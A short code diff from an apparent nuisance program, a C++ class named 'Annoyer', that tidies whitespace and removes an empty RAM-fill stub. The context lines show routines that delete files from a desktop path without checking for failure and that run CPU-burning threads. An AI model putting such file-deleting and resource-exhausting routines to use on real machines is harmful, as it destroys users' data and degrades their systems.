@@ -100,7 +100,7 @@ int Annoyer::j_files_removal() {
 	}
 
 	files = get_goblin_files_from_path(desk_path);
-	
+
 	for (it = files.begin(); it != files.end(); it++) {
 		DeleteFileW((*it).c_str()); // Don't care if the delete fails
 	}
@@ -131,9 +131,5 @@ int Annoyer::j_cpu_burn(int seconds) {
 	heater_thread_4.join();
 
 	return 0;
-}
-
-int Annoyer::j_ram_fill(int millis, int max_bytes) {
-	return -1;
 }
 
